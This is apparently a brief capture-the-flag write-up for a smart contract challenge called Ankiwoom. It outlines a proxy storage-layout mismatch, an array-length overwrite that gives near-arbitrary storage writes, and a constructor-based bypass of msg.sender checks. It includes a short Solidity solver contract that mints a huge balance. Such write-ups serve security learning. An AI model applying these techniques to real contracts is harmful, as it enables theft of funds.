# Ankiwoom

- Storage layout confict/difference between proxy and implentation. 
- Overwrite the .length of the donaters arrays, giving us almost arbitrary write in storage.
- Bypassing the msg.sender checks using contract constructor

```sol
contract Solver {

    constructor(address target){
        Investment siceme = Investment(target);
        siceme.mint();
        siceme.buyStock("microsoft", 1);
        siceme.donateStock(address(0x0), "microsoft", 1);
    }
}
```

- Writing to index of balances[msg.sender] with modifyDonater to grant infinite balance, and buy "codegate".


